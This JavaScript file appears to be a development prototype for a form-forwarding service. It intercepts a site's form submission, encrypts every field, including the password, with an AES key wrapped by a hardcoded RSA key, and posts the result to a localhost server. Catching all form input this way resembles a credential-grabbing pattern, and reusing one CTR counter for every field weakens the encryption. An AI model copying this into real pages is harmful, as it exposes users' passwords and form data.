var formular = document.querySelector('form');

formular.addEventListener('submit', async (e) => {

    e.preventDefault();

    var key = await generateAESKey();

    var iv = window.crypto.getRandomValues(new Uint8Array(16));

    JSONresult = {
        "userData": {},
        "ownerData": {}
    };

    var encrdata = await encryptOwnerData("{\"alg\":\"RSA-OAEP-256\",\"e\":\"AQAB\",\"ext\":true,\"key_ops\":[\"encrypt\",\"wrapKey\"],\"kty\":\"RSA\",\"n\":\"vAlTRTU_FstxFSf5Z50vzHqn94c81DD1eacSKKwyJfK1sZJp7fyvadVezvYe_e8AmDI0wzblfDKtgp42MFa_3qNq4xmnObuTlEYJoSfOemwM_5TsAYl7HWAesDTb_Ij3qsP0B5_O9DOwJJOC3lXrrneyJXkl2JW-Zhw2FmfN1YJpEeMg5jXSaMFuqMhM3g_bbcfdrqmJa-qvOIKSH10h218e_z2cWVJhYlrnIhtzMhC0ELgxEykN8cm2GQ5m5fyvoXKlzqzMkALiKBqqYpg_oz2LyLRKgHZmcbk79nQmw3M4ftQIOoAVYJQXxhbvTpO1oJQJgDX_TO0OGo8bllVi2w\"}", iv, key);

    var encryptedUID = {"0":183,"1":37,"2":200,"3":169,"4":16,"5":166,"6":174,"7":157,"8":171,"9":218,"10":254,"11":1,"12":172,"13":243,"14":200,"15":63,"16":139,"17":235,"18":159,"19":176,"20":189,"21":45,"22":56,"23":110,"24":227,"25":23,"26":254,"27":247,"28":249,"29":179,"30":142,"31":228,"32":213,"33":241,"34":116,"35":21,"36":157,"37":214,"38":186,"39":252,"40":169,"41":11,"42":37,"43":148,"44":245,"45":242,"46":29,"47":39,"48":195,"49":191,"50":54,"51":10,"52":210,"53":102,"54":15,"55":186,"56":92,"57":248,"58":76,"59":74,"60":206,"61":31,"62":66,"63":130,"64":219,"65":17,"66":160,"67":195,"68":149,"69":99,"70":70,"71":230,"72":7,"73":125,"74":193,"75":47,"76":44,"77":111,"78":157,"79":38,"80":87,"81":183,"82":64,"83":251,"84":196,"85":150,"86":16,"87":102,"88":85,"89":113,"90":1,"91":58,"92":190,"93":215,"94":222,"95":217,"96":104,"97":184,"98":226,"99":36,"100":213,"101":91,"102":237,"103":49,"104":72,"105":36,"106":49,"107":222,"108":23,"109":177,"110":230,"111":111,"112":65,"113":217,"114":167,"115":164,"116":220,"117":85,"118":189,"119":94,"120":213,"121":233,"122":32,"123":44,"124":110,"125":51,"126":58,"127":173};

    JSONresult["ownerData"] = encrdata;
    JSONresult["ownerData"]["uid"] = uidJsonToArray(encryptedUID);
    JSONresult["ownerData"]["siteName"] = "jetix";
    
    var data = new FormData(e.target);

    for (var pair of data.entries()) {
        JSONresult["userData"][pair[0]] = await encryptUserData(pair[1], key, iv)
    }

    console.log(JSONresult);

    document.getElementById('password').value = 'SorryBruh'; // GRIJA LA PAROLELE DIN URL !!!!!!!!!!!!!

    fetch("http://localhost:5016",
        {
            method: "POST",
            headers: {
                "Content-Type": "text/plain",
            },
            mode: "no-cors",
            body: JSON.stringify(JSONresult)
        })
        .then(function (response) {
            console.log("Json sent!", response);
        })
});

async function generateAESKey() {
    var AESkey;
    await window.crypto.subtle.generateKey(
        {
            name: "AES-CTR",
            length: 256,
        },
        true,
        ["encrypt", "decrypt"]
    )
    .then(function (result) {
        AESkey = result;
    });

    return AESkey;
}

async function encryptOwnerData(RSAPublicKey, iv, keyToEncrypt) {
    ownerJson = {};

    var algorithm = {
        name: "RSA-OAEP",
        hash: {
            name: "SHA-256"
        }
    };

    RSAPublicKey = await JSON.parse(RSAPublicKey);

    var enc = new TextEncoder();

    await window.crypto.subtle.importKey(
        "jwk",
        RSAPublicKey,
        algorithm,
        true,
        ["encrypt", "wrapKey"]
    )
        .then((key) => {
            RSAPublicKey = key;
        })
        .catch(e => console.log(e.message));

    await window.crypto.subtle.encrypt(
        {
            name: "RSA-OAEP",
        },
        RSAPublicKey,
        iv
    )
        .then(function (encrypted) {
            ownerJson["iv"] = new Uint8Array(encrypted);
        })
        .catch(e => console.log(e.message));

    await window.crypto.subtle.wrapKey(
        "raw", //the export format, must be "raw" (only available sometimes)
        keyToEncrypt, //the key you want to wrap, must be able to fit in RSA-OAEP padding
        RSAPublicKey, //the public key with "wrapKey" usage flag
        {   //these are the wrapping key's algorithm options
            name: "RSA-OAEP"
        }
    )
        .then(function (wrapped) {
            ownerJson["key"] = new Uint8Array(wrapped);
        })
        .catch(e => console.log(e.message));

    return ownerJson;
}

async function encryptUserData(data, key, iv) {
    var encryptedData;
    var enc = new TextEncoder();

    await window.crypto.subtle.encrypt(
        {
            name: "AES-CTR",
            counter: iv,
            length: 128,
        },
        key,
        enc.encode(data)
    )
        .then(function (encrypted) {
            encryptedData = new Uint8Array(encrypted);
        });

    return encryptedData;
}
function uidJsonToArray(json) {
    var ret = new Uint8Array(128);
    for (var i = 0; i < 128; i++) {
        ret[i] = json[i]
    }
    return ret
};